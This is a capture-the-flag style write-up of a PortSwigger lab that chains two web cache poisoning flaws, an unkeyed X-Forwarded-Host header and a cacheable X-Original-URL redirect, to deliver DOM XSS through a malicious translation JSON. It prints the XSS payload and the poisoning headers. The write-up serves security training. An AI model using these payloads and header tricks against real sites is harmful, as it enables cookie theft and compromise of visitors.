#  Combining web cache poisoning vulnerabilities

## 📌 Lab Details
- **Title**: Combining web cache poisoning vulnerabilities
- **Difficulty**: Expert
- **Category**: Web Cache Poisoning
- **Lab URL**: https://portswigger.net/academy/labs/launch/552e7c56a4a7bcc6d371c2ef2481f24b901667060db0fc32531e717b73d4fd7a?referrer=%2fweb-security%2fweb-cache-poisoning%2fexploiting-design-flaws%2flab-web-cache-poisoning-combining-vulnerabilities

## 🔍 Summary
This lab requires chaining multiple web cache poisoning vulnerabilities together to achieve DOM XSS against a victim whose language is fixed to English. <br>
The application loads translation files based on the user's selected language. An unkeyed `X-Forwarded-Host` header can be abused to make the application load a malicious translation file from an attacker-controlled domain. However, the DOM XSS only affects non-English languages. <br>
To exploit the victim, a second cache poisoning vulnerability involving the X-Original-URL header is used to force all users onto the Spanish version of the site, where the poisoned translation file triggers DOM XSS.

## 🛠 Steps to Solve
1. Use **Param Miner** to identify that the `X-Forwarded-Host` and `X-Original-URL` headers are supported.
2. In Burp Repeater, experiment with the `X-Forwarded-Host` header and observe that it can be used to import an arbitrary JSON file instead of the `translations.json` file, which contains translations of UI texts.
3. Notice that the website is vulnerable to DOM-XSS due to the way the `initTranslations()` function handles data from the JSON file for all languages except English.
4. Go to the exploit server and edit the file name to match the path used by the vulnerable website: `/resources/json/translations.json`.
5. In the head, add the header `Access-Control-Allow-Origin: *` to enable CORS.
6. In the body, add malicious JSON that matches the structure used by the real translation file. Replace the value of one of the translations with a suitable XSS payload, for example:
   ```sh
   {
    "en": {
        "name": "English"
    },
    "es": {
        "name": "español",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "</a><img src=1 onerror='alert(document.cookie)' />",
            "Description:": "Descripción"
        }
      }
   }
   ```
7. Store the exploit.
8. In Burp, find a GET request for /?localized=1 that includes the lang cookie for Spanish: `lang=es`.
9. Send the request to Burp Repeater. Add a cache buster and the following header, remembering to enter your own exploit server ID: `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
10. Send the response and confirm that your exploit server is reflected in the response.
11. To simulate the victim, load the URL in the browser and confirm that the alert() fires.
12. Notice that when you change the language on the page to anything other than English, this triggers a redirect, for example, to `/setlang/es`. The user's selected language is set server side using the `lang=es` cookie, and the home page is reloaded with the parameter `?localized=1`.
13. Send the `GET` request for the home page to Burp Repeater and add a cache buster.
14. Observe that the `X-Original-URL` can be used to change the path of the request, so you can explicitly set `/setlang/es`. However, you will find that this response cannot be cached because it contains the `Set-Cookie` header.
15. Observe that the home page sometimes uses backslashes as a folder separator. Notice that the server normalizes these to forward slashes using a redirect. Therefore, `X-Original-URL: /setlang\es` triggers a 302 response that redirects to `/setlang/es`. Observe that this 302 response is cacheable and, therefore, can be used to force other users to the Spanish version of the home page.
16. You now need to combine these two exploits. First, poison the `GET /?localized=1` page using the `X-Forwarded-Host` header to import your malicious JSON file from the exploit server.
17. Now, while the cache is still poisoned, also poison the `GET /` page using `X-Original-URL: /setlang\es` to force all users to the Spanish page.
18. To simulate the victim, load the English page in the browser and make sure that you are redirected and that the `alert()` fires.
19. Replay both requests in sequence to keep the cache poisoned on both pages until the victim visits the site and the lab is solved.

## 📖 Key Takeaways
- Multiple low-impact cache poisoning issues can often be chained into a critical exploit.
- Unkeyed headers are extremely dangerous when used in security-sensitive functionality.\
- Translation systems frequently introduce DOM XSS through unsafe use of `innerHTML`.
- Cacheable redirects can be used to manipulate victim navigation.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ad219af4-091c-4a42-9864-813b5829e4c5" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/68a0a4fa-c4b1-444d-948f-7dfa061986dc" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/9e6ede1b-51c6-4ae8-897b-f51c9ac1ae3b" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/22b11954-bade-4e1c-8eb7-5d3ce58823bc" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/3be6fd80-53ff-41c8-bdb7-2b023d9da32b" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/8358229e-c575-4f9f-bb9c-d9db2b5a2497" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/5208617d-bbfc-48a9-a50d-6fab6f49c9df" />
